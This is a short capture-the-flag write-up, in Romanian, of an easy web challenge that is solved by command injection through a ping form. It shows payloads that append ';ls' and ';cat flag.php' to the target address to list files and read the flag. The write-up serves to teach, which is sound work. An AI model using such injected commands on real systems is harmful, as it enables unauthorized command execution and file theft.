# Write-up: Injector 

<img width="839" height="184" alt="image" src="https://github.com/user-attachments/assets/47282066-f7b8-406c-9518-fba3395b1f52" />


![Author](https://img.shields.io/badge/Author-skyv3il-red?style=for-the-badge)

![Category](https://img.shields.io/badge/Category-Web%20Exploitation-orange?style=for-the-badge&logo=kalilinux)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge)

![Points](https://img.shields.io/badge/Points-500-success?style=for-the-badge)

![Status](https://img.shields.io/badge/Status-SOLVED-brightgreen?style=for-the-badge)        


# Rezolvare:

## Challangeul este un simplu Comand Injection folosind comanda ping 

<img width="668" height="94" alt="image" src="https://github.com/user-attachments/assets/a9dca746-3b7c-477c-922b-aa5913b5b46f" />

## Pentru a iesi din contextul comenzii `ping`, am folosit caracterul (`;`). Sistemul va executa prima comanda, iar apoi va executa imediat a doua comanda injectata.
```python
http://<IP>;ls 
```
<img width="688" height="124" alt="image" src="https://github.com/user-attachments/assets/82419710-f3e5-466e-a107-624d2fbdeaca" />

# Dupa ce am aflat unde este vulnerabilitatea, putem citi flagul din directorul curent :

```python
http://<IP>;cat flag.php
```
<img width="951" height="196" alt="image" src="https://github.com/user-attachments/assets/eccb17c0-d8ea-4949-bfeb-989583dae3c5" />
